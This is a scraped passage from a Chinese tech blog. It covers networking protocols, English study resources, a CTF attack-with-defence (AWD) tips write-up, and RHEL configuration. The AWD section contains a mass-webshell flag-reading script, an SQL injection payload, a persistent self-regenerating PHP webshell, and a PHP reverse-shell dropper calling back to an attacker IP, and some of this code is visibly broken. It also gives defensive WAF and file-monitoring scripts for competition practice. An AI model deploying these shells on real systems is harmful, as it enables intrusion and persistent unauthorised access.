（2）如果主机A在ARP缓存中没有找到映射，它将询问192.168.1.2的硬件地址，从而将ARP请求帧广播到本地网络上的所有主机。源主机A的IP地址和MAC地址都包括在ARP请求中。本地网络上的每台主机都接收到ARP请求并且检查是否与自己的IP地址匹配。如果主机发现请求的IP地址与自己的IP地址不匹配，它将丢弃ARP请求。 （3）主机B确定ARP请求中的IP地址与自己的IP地址匹配，则将主机A的IP地址和MAC地址映射添加到本地ARP缓存中。 （4）主机B将包含其MAC地址的ARP回复消息直接发送回主机A。 （5）当主机A收到从主机B发来的ARP回复消息时，会用主机B的IP和MAC地址映射更新ARP缓存。本机缓存是有生存期的，生存期结束后，将再次重复上面的过程。主机B的MAC地址一旦确定，主机A就能向主机B发送IP通信了。 逆地址解析协议，即RARP，功能和ARP协议相对，其将局域网中某个主机的物理地址转换为IP地址 ，比如局域网中有一台主机只知道物理地址而不知道IP地址，那么可以通过RARP协议发出征求自身IP地址的广播请求，然后由RARP服务器负责回答。 RARP协议工作流程： （1）给主机发送一个本地的RARP广播，在此广播包中，声明自己的MAC地址并且请求任何收到此请求的RARP服务器分配一个IP地址； （2）本地网段上的RARP服务器收到此请求后，检查其RARP列表，查找该MAC地址对应的IP地址； （3）如果存在，RARP服务器就给源主机发送一个响应数据包并将此IP地址提供给对方主机使用； （4）如果不存在，RARP服务器对此不做任何的响应； 6. 路由选择协议常见的路由选择协议有：RIP协议、OSPF协议。 RIP协议：底层是贝尔曼福特算法，它选择路由的度量标准（metric)是跳数，最大跳数是15跳，如果大于15跳，它就会丢弃数据包。 OSPF协议：Open Shortest Path First开放式最短路径优先，底层是迪杰斯特拉算法，是链路状态路由选择协议，它选择路由的度量标准是带宽，延迟。 7. TCP/IP协议TCP/IP协议是Internet最基本的协议、Internet国际互联网络的基础，由网络层的IP协议和传输层的TCP协议组成。通俗而言：TCP负责发现传输的问题，一有问题就发出信号，要求重新传输，直到所有数据安全正确地传输到目的地。而IP是给因特网的每一台联网设备规定一个地址。 IP层接收由更低层（网络接口层例如以太网设备驱动程序）发来的数据包，并把该数据包发送到更高层—TCP或UDP层；相反，IP层也把从TCP或UDP层接收来的数据包传送到更低层。IP数据包是不可靠的，因为IP并没有做任何事情来确认数据包是否按顺序发送的或者有没有被破坏，IP数据包中含有发送它的主机的地址（源地址）和接收它的主机的地址（目的地址）。 TCP是面向连接的通信协议，通过三次握手建立连接，通讯完成时要拆除连接，由于TCP是面向连接的所以只能用于端到端的通讯。TCP提供的是一种可靠的数据流服务，采用”带重传的肯定确认”技术来实现传输的可靠性。TCP还采用一种称为”滑动窗口”的方式进行流量控制，所谓窗口实际表示接收能力，用以限制发送方的发送速度。 TCP报文首部格式： tcp messages TCP协议的三次握手和四次挥手： tcp 3 hold hand 注：seq:”sequance”序列号；ack:”acknowledge”确认号；SYN:”synchronize”请求同步标志；；ACK:”acknowledge”确认标志”；**FIN**：”Finally”结束标志。 TCP连接建立过程：首先Client端发送连接请求报文，Server段接受连接后回复ACK报文，并为这次连接分配资源。Client端接收到ACK报文后也向Server段发生ACK报文，并分配资源，这样TCP连接就建立了。 TCP连接断开过程：假设Client端发起中断连接请求，也就是发送FIN报文。Server端接到FIN报文后，意思是说”我Client端没有数据要发给你了”，但是如果你还有数据没有发送完成，则不必急着关闭Socket，可以继续发送数据。所以你先发送ACK，”告诉Client端，你的请求我收到了，但是我还没准备好，请继续你等我的消息”。这个时候Client端就进入FIN_WAIT状态，继续等待Server端的FIN报文。当Server端确定数据已发送完成，则向Client端发送FIN报文，”告诉Client端，好了，我这边数据发完了，准备好关闭连接了”。Client端收到FIN报文后，”就知道可以关闭连接了，但是他还是不相信网络，怕Server端不知道要关闭，所以发送ACK后进入TIME_WAIT状态，如果Server端没有收到ACK则可以重传。”，Server端收到ACK后，”就知道可以断开连接了”。Client端等待了2MSL后依然没有收到回复，则证明Server端已正常关闭，那好，我Client端也可以关闭连接了。Ok，TCP连接就这样关闭了！ 为什么要三次握手？ 在只有两次”握手”的情形下，假设Client想跟Server建立连接，但是却因为中途连接请求的数据报丢失了，故Client端不得不重新发送一遍；这个时候Server端仅收到一个连接请求，因此可以正常的建立连接。但是，有时候Client端重新发送请求不是因为数据报丢失了，而是有可能数据传输过程因为网络并发量很大在某结点被阻塞了，这种情形下Server端将先后收到2次请求，并持续等待两个Client请求向他发送数据…问题就在这里，Cient端实际上只有一次请求，而Server端却有2个响应，极端的情况可能由于Client端多次重新发送请求数据而导致Server端最后建立了N多个响应在等待，因而造成极大的资源浪费！所以，”三次握手”很有必要！ 为什么要四次握手？试想一下，假如现在你是客户端你想断开跟Server的所有连接该怎么做？第一步，你自己先停止向Server端发送数据，并等待Server的回复。但事情还没有完，虽然你自身不往Server发送数据了，但是因为你们之前已经建立好平等的连接了，所以此时他也有主动权向你发送数据；故Server端还得终止主动向你发送数据，并等待你的确认。其实，说白了就是保证双方的一个合约的完整执行！ 使用TCP的协议：FTP（文件传输协议）、Telnet（远程登录协议）、SMTP（简单邮件传输协议）、POP3（和SMTP相对，用于接收邮件）、HTTP协议等。 8. UDP协议UDP用户数据报协议，是面向无连接的通讯协议，UDP数据包括目的端口号和源端口号信息，由于通讯不需要连接，所以可以实现广播发送。 UDP通讯时不需要接收方确认，属于不可靠的传输，可能会出现丢包现象，实际应用中要求程序员编程验证。UDP与TCP位于同一层，但它不管数据包的顺序、错误或重发。因此，UDP不被应用于那些使用虚电路的面向连接的服务，UDP主要用于那些面向查询—应答的服务，例如NFS。相对于FTP或Telnet，这些服务需要交换的信息量较小。每个UDP报文分UDP报头和UDP数据区两部分。报头由四个16位长（2字节）字段组成，分别说明该报文的源端口、目的端口、报文长度以及校验值。UDP报头由4个域组成，其中每个域各占用2个字节，具体如下： （1）源端口号； （2）目标端口号； （3）数据报长度； （4）校验值。 使用UDP协议包括：TFTP（简单文件传输协议）、SNMP（简单网络管理协议）、DNS（域名解析协议）、NFS、BOOTP。 TCP与UDP的区别:TCP是面向连接的，可靠的字节流服务；UDP是面向无连接的，不可靠的数据报服务。 9. DNS协议DNS是域名系统(DomainNameSystem)的缩写，该系统用于命名组织到域层次结构中的计算机和网络服务，可以简单地理解为将URL转换为IP地址。域名是由圆点分开一串单词或缩写组成的，每一个域名都对应一个惟一的IP地址，在Internet上域名与IP地址之间是一一对应的，DNS就是进行域名解析的服务器。DNS命名用于Internet等TCP/IP网络中，通过用户友好的名称查找计算机和服务。 10. NAT协议 NAT网络地址转换(Network Address Translation)属接入广域网(WAN)技术，是一种将私有（保留）地址转化为合法IP地址的转换技术，它被广泛应用于各种类型Internet接入方式和各种类型的网络中。原因很简单，NAT不仅完美地解决了lP地址不足的问题，而且还能够有效地避免来自网络外部的攻击，隐藏并保护网络内部的计算机。 11. DHCP协议DHCP动态主机设置协议（Dynamic Host Configuration Protocol）是一个局域网的网络协议，使用UDP协议工作，主要有两个用途：给内部网络或网络服务供应商自动分配IP地址，给用户或者内部网络管理员作为对所有计算机作中央管理的手段。 12. HTTP协议超文本传输协议（HTTP，HyperText Transfer Protocol)是互联网上应用最为广泛的一种网络协议。所有的WWW文件都必须遵守这个标准。 HTTP 协议包括哪些请求？GET：请求读取由URL所标志的信息。POST：给服务器添加信息（如注释）。PUT：在给定的URL下存储一个文档。DELETE：删除给定的URL所标志的资源。 HTTP 中， POST 与 GET 的区别 1）Get是从服务器上获取数据，Post是向服务器传送数据。 2）Get是把参数数据队列加到提交表单的Action属性所指向的URL中，值和表单内各个字段一一对应，在URL中可以看到。 3）Get传送的数据量小，不能大于2KB；Post传送的数据量较大，一般被默认为不受限制。 4）根据HTTP规范，GET用于信息获取，而且应该是安全的和幂等的。 I. 所谓 安全的 意味着该操作用于获取信息而非修改信息。换句话说，GET请求一般不应产生副作用。就是说，它仅仅是获取资源信息，就像数据库查询一样，不会修改，增加数据，不会影响资源的状态。 II. 幂等 的意味着对同一URL的多个请求应该返回同样的结果。 13. 一个举例在浏览器中输入 http://www.baidu.com/ 后执行的全部过程。 现在假设如果我们在客户端（客户端）浏览器中输入 http://www.baidu.com， 而 baidu.com 为要访问的服务器（服务器），下面详细分析客户端为了访问服务器而执行的一系列关于协议的操作： 1）客户端浏览器通过DNS解析到 www.baidu.com 的IP地址220.181.27.48，通过这个IP地址找到客户端到服务器的路径。客户端浏览器发起一个HTTP会话到220.161.27.48，然后通过TCP进行封装数据包，输入到网络层。 2）在客户端的传输层，把HTTP会话请求分成报文段，添加源和目的端口，如服务器使用80端口监听客户端的请求，客户端由系统随机选择一个端口如5000，与服务器进行交换，服务器把相应的请求返回给客户端的5000端口。然后使用IP层的IP地址查找目的端。 3）客户端的网络层不用关系应用层或者传输层的东西，主要做的是通过查找路由表确定如何到达服务器，期间可能经过多个路由器，这些都是由路由器来完成的工作，不作过多的描述，无非就是通过查找路由表决定通过那个路径到达服务器。 4）客户端的链路层，包通过链路层发送到路由器，通过邻居协议查找给定IP地址的MAC地址，然后发送ARP请求查找目的地址，如果得到回应后就可以使用ARP的请求应答交换的IP数据包现在就可以传输了，然后发送IP数据包到达服务器的地址。 1原文链接：http://www.cnblogs.com/maybe2030/p/4781555.html","tags":[{"name":"网络通信","slug":"网络通信","permalink":"http://www.deops.cn/tags/网络通信/"}]},{"title":"我学练英语所使用的方法、工具与资料","date":"2018-08-23T15:55:04.000Z","path":"/posts/9bf5b5/","text":"原文：dramatea 试用过的方法（按进展的时间顺序）初中高中大学的英语课堂与考试【不得不承认我那可怜的语法知识和大多数单词都是在这个阶段掌握的使用背单词工具，按照记忆曲线每日死记硬背新词或复习旧词（扇贝打卡记录：http://www.shanbay.com/checkin/user/920425/【对于我这种记性差的人此法效果很一般。坚持打卡370天后停止使用扇贝。但换了个百词斩偶尔再背背单词奶爸英语教室中级 http://t.cn/zjSMhMCeasy VOA http://www.easyvoa.com/ （美国之音，测试自己是否听懂，判断级别（读记——恶魔奶爸的英语学习方法 http://dramatea.com/a/397【完成了第一步骤，发音的纠正。后根据自己的情况调整后续方法在应用中练习（练英语长知识两不误①直接去阅读英文的文章和书籍，不认识的单词查词典；②重复看/听英语视频（带中英字幕）；（需要发音、词汇量、语法有那么点基础【中阶ing… 发音练习音标发音的教程视频和flash什么的（好早前用过，找不到了赖世雄美语音标 http://t.cn/zRtwZA7 （跟着赖老师的课程练习发音就好 词汇Test Your Vocab http://testyourvocab.com（词汇量测试海词 http://dict.cn/（词典，常用，汉→英，英→汉扇贝网 http://shanbay.com （背单词/阅读/小组内互相激励百词斩 http://www.baicizhan.com （背单词，现用 分享自制的英语词汇表：乔布斯2005年在斯坦福大学的演讲（224词） 扇贝单词书 / 演讲视频(中英字幕)TED：Ernesto Sirolli – 想要帮助别人？闭嘴，听人家说！（546词）扇贝单词书 / 演讲视频电影《Hotel Transylvania》(1542词) 完整词串下载 / 扇贝词串 / 电影介绍耶鲁公开课：美国现代主义文学选读 第三课(1257词) 完整词串下载 / 课程视频 语法上学时的英语老师们的喋喋不休辛勤传授语法书 阅读The Little Prince （好读、有趣、书不厚我的阅读方法是，一次读一章节，不懂的单词查字典并标记（Kindle上比较方便）；读完本章节后回顾标记的单词；第二天先回顾昨日标记单词，再复看昨日章节；然后继续阅读下一章节；如此方式持续读完。 视听TED http://www.ted.com/talks （丰富优质的演讲视频，有多国语言字幕 史蒂夫·乔布斯2005年6月在斯坦福大学毕业典礼上的演讲词串下载 / 演讲文本(英文+中文)下载 / 演讲视频(中英字幕) / 演讲音频 Joe Wang’s Talk Show on the Late Show词串下载 / 脱口秀视频","tags":[{"name":"学习","slug":"学习","permalink":"http://www.deops.cn/tags/学习/"},{"name":"英语","slug":"英语","permalink":"http://www.deops.cn/tags/英语/"}]},{"title":"CTF线下赛AWD套路小结","date":"2018-08-13T09:03:28.000Z","path":"/posts/28c30eb2/","text":"CTF网络安全攻防赛入门，如果你对黑客攻防感兴趣的话看看这篇入门。新手该知道的一些知识以及技巧，下面简单整理一下 原创：tinyfisher转载：先知安全技术社区 最近打了2场CTF线下赛，把AWD模式中的一些小套路做一些总结，本人web狗，二进制部分就不班门弄斧了。 一、AWD模式简介AWD: Attack With Defence, 比赛中每个队伍维护多台服务器，服务器中存在多个漏洞，利用漏洞攻击其他队伍可以进行得分，修复漏洞可以避免被其他队伍攻击失分。 一般分配Web服务器，服务器（多数为Linux）某处存在flag（一般在根目录下）； 可能会提供一台流量分析虚拟机，可以下载流量文件进行数据分析； flag在主办方的设定下每隔一定时间刷新一轮； 各队一般都有自己的初始分数； flag一旦被其他队伍拿走，该队扣除一定积分； 扣除的积分有获取flag的队伍均分； 主办方会对每个队伍的服务进行check，服务宕机扣除本轮flag分数，扣除的分值由服务check正常的队伍均分； 一般每个队伍会给一个低权限用户，非root权限 二、网络环境网络拓扑图如下图所示： 拓扑图 比赛中获取flag一般有两种模式：（1）flag在根目录，读取flag内容，提交即可得分（2）拿到其他队伍shell后，执行指定命令（curl 10.0.0.2），即可从上图中flag机获取flag内容； 比赛可能会告诉其他队伍的IP，也可能不会告诉你，一般在同一个C段或者B段，因此首先利用nmap等扫描工具发现其他队伍的IP：nmap -sn 192.168.71.0/24或者利用https://github.com/zer0h/httpscan 的脚本进行扫描 三、 比赛分工线下赛一般3人左右，2人攻击，1人防御，因为发现的漏洞可以攻击其他队伍，也要进行修复，所以攻防相辅相成，以攻为守。 比赛中每个队伍可能会维护多个靶机，web、二进制等，也可以没人负责一台，各自负责攻击和防御。 四、 一些“套路” 备份！备份！备份！重要的事情说三遍，比赛开始后第一时间备份服务器中web目录下的文件（/var/www/html)，这是我自我审计的基础，也是防止服务器在比赛中出现异常的情况下可以立即恢复到初始状态的先决条件。有的比赛可以提供3次左右的恢复初始设置的机会，有的比赛不提供，所以备份十分重要。 可以用scp命令，也可以用一些图形化的工具：Winscp、FileZilla，操作起来比价方便。 winscp 口令问题弱口令的问题几乎是必考，比赛开始后，如果发现每个队伍的SSH账号密码都是一样的（某次比赛中都是phpCMS、WordPress），需要立即修改口令，如果被其他队伍改了那就gg了。 Web后台很有可能存在弱口令，一般都是admin\\admin,admin\\123456,test\\test等等，需要立即修改，也可以修改其他队伍的后台口令，为本队所用，说不定可以利用后台getshell，比如十分常见的WordPress。 预留后门在维护的服务器上，很有可能已经预留了一个或多个后门，比如一句话木马，这是个送分题，可以利用这个漏洞迅速打一波，还可以视情况“搅屎”，利用这个漏洞一直维持权限，每轮都得分（后面细说）将服务器中web目录下载到本地，利用D盾扫描，一般就可以发现预留后门： D-dun 发现后门，第一时间删除，同时利用这个漏洞发起第一波攻击，如果利用菜刀连，显然不够优雅，还没连完，人家估计都删的差不多了，因此这个漏洞虽然是送分题，但有时拼的是手速，因此得提前准备好脚本：123456789101112131415161718192021222324#coding=utf-8import requestsurl=\"http://192.168.71.\"url1=\"\"shell=\"/Upload/index.php\"passwd=\"abcde10db05bd4f6a24c94d7edde441d18545\"port=\"80\"payload = &#123;passwd: 'system(\\'cat /flag\\');'&#125;f=open(\"webshelllist.txt\",\"w\")f1=oepn(\"firstroud_flag.txt\",\"w\")for i in[51,52,53,11,12,13,21,22,23,31,32,33,41,42,43,71,72,73,81,82,83]: url1=url+str(i)+\":\"+port+shell try: res=requests.post(url1,payload,timeout=1) if res.status_code == requests.codes.ok: print url1+\" connect shell sucess, flag is \"+res.text print &gt;&gt;f1,url1+\" connect shell sucess, flag is \"+res.text print &gt;&gt;f,url1+\",\"+passwd else: print \"shell not found!\" except: print url1+\" connect shell fail\"f.close()f1.close() 配置一下其他队伍地址、shell路径和密码，就可以进行攻击，发了个记录在firstround_flag.txt中，某次比赛实际情况如下： flag 常见漏洞常见漏洞包括SQL注入、文件包括、文件上传等等。对于SQL注入类的漏洞，一般不会有过滤，可以用sqlmap跑出来，在利用-sql-shell执行，select load_file(&#39;/flag&#39;);即可得到flag，也可以利用into outfile写木马维持权限，弹药根据实际情况，可能会遇到权限问题。用sqlmap跑比较耗时，可以利用payload写一个python，自动化进行攻击：12345678910def sqli(host): global sess_admin date = &#123;\"section_name\";\"asd\",\"admin_name\"&#125;: \" '||(SELECT updatexml(1,concat(0x7e,(select load_file('/flag')),0x7e),1))||'\",\"announcement\";\"asd\" r = sess_admin.post('http://%s/index.php/section/add'%host,data=data) flags = re.findall(r'~(.+?)~',r.content) if flags: return flags[0] else: return \"error pwn!\" 上传漏洞一般也是比较简单的黑名单过滤、服务器解析漏洞等等，可以直接上传木马； 五、权限维持这里说的方法就比较“搅屎”了，上面说到利用预留后门可以维持权限，主要哟两种，一种是“不死马”，另一种是反弹shell “不死马”1234567891011&lt;?php set_time_limit(0); ignore_user_abort(1); unlink(__FILE__); while(1)&#123; file_put_contents('./.config.php','&lt;?php $_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(101).$uU(97.$_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(101).$uU(97)?&gt;'); system('chmod 777 .config.php'); touch(\"./.config.php\",mktime(20,15,1,11,28,2016)); usleep(100); &#125; ?&gt; 利用预留后门，上传上面的“不死马“并访问，就会一直生成.config.php的一句话木马，木马内容可以自修修改，只要别被其他队伍看懂就行，哈哈哈 “反弹shell”12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?php function which($pr) &#123; $path = excute(\"which $pr\"); return ($path ? $path : $pr); &#125; function excute($cfe) &#123; $res = ''; if ($cfe) &#123; if(function_exists('exec')) &#123; @exec($cfe,$res); $res = join(\"\\n\",$res); &#125; elseif (function_exists('shell_exec')) &#123; $res = @shell_exec($cfe); &#125; elseif(function_exists('system')) &#123; @ob_start(); @system($cfe); $res = @ob_get_contents(); @ob_end_clean(); &#125; elseif (function_exists('passthru')) &#123; @ob_start(); @passthru($cfe); $res = @ob_get_contents(); @ob_end_clean(); &#125; elseif (@is_resource($f = @popen($cfe,\"r\"))) &#123; $res = @fread($f, 1024); &#125; @pclose($f); &#125; return $res; &#125; function cf($name,$text)&#123; if($fp=@fopen($fname, 'w')) &#123; $fputs($fp,@base64_decode($text)); @fclose($fp); &#125; &#125; $yourip = \"192.168.71.1\"; $yourport = '9999'; $usedb = array('per'=&gt;'perl','c'=&gt;'c'); $back_connect=\"...\" cf('/tmp/.bc',$back_connect); $res = execute(which('perl')\" /tmp/.db $yourip $yourport &amp;\");?&gt; 利用预留后门上传上面的php文件并访问，就可以用nc反弹shell，之后就可以一直得分了 php 需要注意的是，上面的2中方法，需要网站的权限为www-data,如果网站的权限是ctf，那么是没有权限上传文件的。 六、 通用防御对于防御，一般通用有两种方法：WAF、文件监控1. WAF 使用方法： 将waf.php传到要包含的文件的目录 在页面中加入防护，哟两种做法，根据情况二选一即可：a).在所需要防护的页面加入代码require_once(&#39;waf.php&#39;);就可以做到页面防注入、跨站如果想整站防注，就在网站的一个公用文件中，如数据库链接文件config.icn.php中！添加require_once(&#39;waf.php&#39;);来调用代码常用php系统添加文件 PHPCMS v9 \\phpcms\\base.phpPHPWIND8.7 \\data\\sql_config.phpDEDECMS 5.7 \\data\\common.inc.phpDiscuz X2 \\config\\config.php_global.phpWordPress \\wp-config.phpMetinfo \\include\\head.php b). 在每个文件最前加上代码在php.ini中找到12Automaticaly add files before or after any PHP document.auto_prepend_file = 360_safe3.php路径； 需要注意的是，部署waf可能会导致服务不可用，需要谨慎部署。 2. 文件监控文件监控可以对web目录进行监控，发现新上传文件或者被修改立即恢复，这样可以防止上传shell等攻击：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173# -*- coding: utf-8 -*-#use: python file_check.py ./import osimport hashlibimport shutilimport ntpathimport timeCWD = os.getcwd()FILE_MD5_DICT = &#123;&#125; #文件MD5字典ORIGIN_FILE_LIST = []#特殊文件路径字符串Special_path_str = 'drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82'bakstring = 'bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS'logstring = 'log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'webshellstring = 'webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'difffile = 'diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN'Special_string = 'drops_log' #免死金牌UNICODE_ENCODEING = \"utf-8\"INVALID_UNICODE_CHAR_FORMAT = r\"\\?%02x\"# 文件路径字典spec_base_path = os.path.realpath(os.path.join(CWD,Special_path_str))Special_path = &#123;'bak' : os.path.realpath(os.path.join(spec_base_path,bakstring)),'log' : os.path.realpath(os.path.join(spec_base_path,logstring)),'webshell' : os.path.realpath(os.path.join(spec_base_path,webshellstring)),'diffile' : os.path.realpath(os.path.join(spec_base_path,diffile)),&#125;def isListLike(value): return isinstance(value, (list, tuple, set))# 获取Unicode编码def getUnicode(value, encoding=None, noneToNull=False): if noneTuNull and value is None: return noneTuNull if isListLike(value): value = list(getUnicode(_, encoding, noneToNull) for _ in value) return value if isinstance(value,unicode): return value elif isinstance(value, basestring): while True: try: return unicode(value, encoding or UNICODE_ENCODING) except UnicodeDecodeError, ex: try: return unicode(value, UNICODE_ENCODING) except: value = value[:ex.start]+\"\".join(INVALID_UNICODE_CAHR_FORMAT % ord(_) for _ in value[ex.start:ex.end]) + value[ex.end:] else: try: return unicode(value) except UnicodeDecodeError: return unicode(str(value), errors=\"ignore\")# 目录创建def mkdir_p(path): import errno try: os.makedirs(path) except OSRrror as exc: if exc.errno == errno.EEXIST and os.path.isdir(path): pass else: raise# 获取当前所有文件路径def getfilelist(cwd): filelist = [] for root,subdirs, files in os.walk(cwd): for filepath in files: originalfile = os.path.join(root, filepath) if Special_path_str not in originalfile: filelist.append(originalfile) return filelist# 计算机文件MD5值def calcMD5(filepath): try: with open(filepath,'rb') as f: md5obj = hashlib.md5() md5obj.update(f.read()) hash = md5obj.hexdigest() return hash except Exception, e: print u'[!] getmd5_error : '+getUnicode(filepath) print getUnicode(e) try: ORIGIN_FILE_LIST.remove(fielpath) FILE_MD5_DICT.pop(filepath,None) except KeyError, e: pass# 获取所有文件MD5def getfilemd5dict(filelist = []): filemd5dict = &#123;&#125; for ori_file in filelist: if Special_path_str not in ori_file: md5 = calcMD5(os.path.realpath(ori_file)) if md5: filemd5dict[ori_file] = md5 return filemd5dict# 备份所有文件def backup_file(filelist=[]): # if len(os.listdir(Special_path['bak'])) == 0; for filepath in filelist: if Special_path_str not in filepath: shutil.copy2(filepathm Special_path['bak'])if __name__ == '__main__': print u'-------------start---------------' for value in Special_path: mkdir_p(Special_path[value]) # 获取所有文件路径，并获取所有文件的MD5，同事备份所有文件 ORIGIN_FILE_LIST = getfilelist(CWD) FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST) backup_file(ORIGIN_FILE_LIST) # TODO 备份文件可能会产生重名BUG print u'[*] pre work end!' while True: file_lsit = getfilelist(CWD) # 移除新上传文件 diff_file_list = list(set(file_lsit) ^ set(ORIGIN_FILE_LIST)) if len(diff_file_list) != 0: # import pdb;pdb.set_trace() for filepath in diff_file_list: try: f = open(filepath, 'r').read() except Exception, e: break if Special_string not in f: try: print u'[*] websehll find :' + getUnicode(filepath) shutil.move(filepath,os.path.join(Special_path['webshell'],ntpath.basename(filepath) + '.txt')) except Exception as e: print u'[!] move webshell error, \"%s\" maybe is webshell.'%getUnicode(filepath) try: f = open(os.path.join(Special_path['log'],'log.txt'),'a') f.write('newfile: ' + getUnicode(filepath) = ' : ' + str(time.ctime()) + '\\n') f.close() except Exception as e: print u'[-] log error : file move error: ' + getUnicode(e)# 防止任意文件被修改，还原被修改文件md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)for filekey in md5_dict: if md5_dict[filekey] != FILE_MD5_DICT[filekey]: try: f = open(filekey, 'r').read() except Exception, e: break if Special_string not in f: try: print u'[*] file had be change : ' + getUnicode(filekey) shutil.move(filekey, os.path.join(Special_path['difffile'], ntpath.basename(filekey) + '.txt')) shutil.move(os.path.join(Special_path['bak'], ntpath.basename(filekey)), filekey) except Exception as e: print u'[!] move webshell error, \"%\" maybe is webshell.'%getUnicode(filekey) try: f = open(os.path.join(Special_path['log'],'log.txt'),'a') f.write('diff_file: ' + getUnicode(filekey) + ' : ' + getUnicode(time.ctime()) + '\\n') f.close() except Exception as e: print u'[-] log error : done_diff: ' + getUnicode(filekey) passtime.sleep(2)#print `[*] ' + getUnicode(time.ctime()) 七、自动提交有的比赛只有几分钟一轮，手工提交其他队伍的flag显然不行，需要准备批量提交flag的脚本：123456789101112131415161718192021222324252627282930313233#!/usr/bin/env python2import sysimport jsonimport urllibimport httplibserver_host = '10.10.0.2'server_port = 80def submit(team_token, flag, host=server_host, port=server_port, timeout=5): if not team_token or not flag: raise Exception('team_token or flag not found') conn = httplib.HTTPConnection(host, port, timeout=timeout) params = urllib.urlencode(&#123; 'token': team_token, 'flag': flag, &#125;) headers = &#123; \"Content-type\": \"application/x-www-form-urlencoded\" &#125; conn.request('POST', '/api/submit_flag', params, headers) response = conn.getresponse() data - response.read() return json.loads(data)if __name__ == '__main__': if len(sys.argv) &lt; 3: print 'usage: ./submitflag.py $team_token $flag' sys.exit() host = server_host if len(sys.argv) &gt; 3: host = sys.argv[3] print json.dumps(submit(sys.argv[1],sys.argv[2], host=host), indent=4) 八、流量、日志通过流量、日志的分析： 感知可能正在发生的攻击，从而规避存在的安全风险 应急响应，还原攻击者的攻击路径，从而挽回已经造成的损失 analysis php-script 最后脚本源码链接","tags":[{"name":"CTF","slug":"CTF","permalink":"http://www.deops.cn/tags/CTF/"},{"name":"信息安全","slug":"信息安全","permalink":"http://www.deops.cn/tags/信息安全/"},{"name":"网络空间安全","slug":"网络空间安全","permalink":"http://www.deops.cn/tags/网络空间安全/"},{"name":"Python","slug":"Python","permalink":"http://www.deops.cn/tags/Python/"}]},{"title":"RHEL 7配置Yum软件仓库","date":"2018-08-07T07:18:07.000Z","path":"/posts/afdfa673/","text":"离线环境环境下配置一个本地yum软件仓库，简单整理一下。Yum软件仓库的作用是为了进一步简化RPM管理软件的难度以及自动分析所需软件包及其依赖关系的技术。 第1步： 切换到/etc/yum.repos.d/目录中，（yum配置文件存放路径)第2步： 创建一个配置文件（文件名可随意，但后缀名必须是.repo）1234567[root@rhel_7 ~]# cd /etc/yum.repos.d/[root@rhel_7 yum.repos.d]# vi rhel7.repo[rhel7]name=rhel7baseurl=file:///media/cdromenabled=1gpgcheck=0 [rhel7] # yum仓库唯一标识符，避免与其他仓库冲突。 name=rhel7 # yum名称描述，易于识别仓库用处。 baseurl=file:///media/cdrom # 提供的方式包括FTP(ftp://..)、HTTP(http://..)、本地(file:///..) enabled=1 # 设置yum是否可用；1可用，0禁用。 gpgcheck=1 # 设置yum是否校验文件，1校验，0不校验。 gpgkey=file:///media/cdrom/RPM-GPG-KEY-rehat-release # 若gpgcheck开启，须指定公钥文件地址 第3步：创建本地软件仓挂载ISO镜像或者上传到本地 1234[root@rhel_7 ~]# mkdir -p /media/cdrom[root@rhel_7 ~]# mount -t iso9660 -o loop /usr/local/src/RHEL-server-7.0-x86_64.iso /media/cdrom[root@rhel_7 ~]# vim /etc/fstab/usr/local/src/RHEL-server-7.0-x86_64.iso /media/cdrom iso9660 default,ro.loop 0 0","tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.deops.cn/tags/Linux/"},{"name":"RedHat","slug":"RedHat","permalink":"http://www.deops.cn/tags/RedHat/"},{"name":"yum","slug":"yum","permalink":"http://www.deops.cn/tags/yum/"}]},{"title":"RedHat_7 配置网卡信息","date":"2018-08-07T06:24:44.000Z","path":"/posts/eb7dbe25/","text":"&nbsp;&nbsp;如果您具备一定的运维经验或者熟悉早期的Linux系统，则在学习RHEL 7时可能会遇到一些不容易接受的差异化。在RHEL 5、RHEL 6中，网卡配置的前缀为eth，第1块网卡为eth0，第2块网卡为eth1；以此类推。&nbsp;&nbsp;而在RHEL 7中，网卡配置文件的前缀则为ifcfg开头，然后加上网卡名称共同组成了网卡配置文件的名字，例如ifcfg-eno16777736；好在除了文件名变化外也没有其他大的区别。 第1步： 首先切换到/etc/sysconfig/network-scripts/目录中（存放着网卡的配置文件）第2步： 编辑网卡文件ifcfg-eno16777736 设备类型：TYPE=Ethernet 地址分配模式：BOOTPROTO=static 网卡名称：NAME=eno16777736 是否启动：ONBOOT=yes IP地址：IPADDR=192.168.1.10 子网掩码：NETMASK=255.255.255.0 网关地址：GATEWAY=192.168.1.1 DNS地址：DNS1=114.114.114.114 123456789101112[root@rhel_7 network-scripts]# vim ifcfg-eno16777736 TYPE=Ethernet BOTOPROTO=static NAME=eno16777736 ONBOOT=yes IPADDR=192.168.1.74 NETMASK=255.255.255.0 GATEWAY=192.168.1.1 DNS1=114.114.114.114 DNS2=192.168.1.1~ ~[root@rhel_7 network-scripts]# systemctl restart network","tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.deops.cn/tags/Linux/"},{"name":"RedHat","slug":"RedHat","permalink":"http://www.deops.cn/tags/RedHat/"},{"name":"rhel","slug":"rhel","permalink":"http://www.deops.cn/tags/rhel/"}]},{"title":"RedHat Linux重置root管理员密码","date":"2018-08-05T07:48:25.000Z","path":"/posts/32546aed/","text":"前言平日里让运维人员头疼的事情已经很多了，因此偶尔把linux系统的密码忘记了并不用慌，只需简单几步就可以完成密码的重置工作。 基于rhel版本RedHat、CentOS、 重启Linux系统主机出现引导界面，按下键盘上的E键进入内核编辑界面 boot-img 在linux16 参数这行的最后添加rd.break,然后按下Ctrl+X运行1234linux16 /vmlinuz-3.10.0-123.e17.x86_64 root=UUID=039848c2-4663-4223-a7\\52-e07bf143e52d ro rd.lvm.lv=rhel/root crashkernel=auto 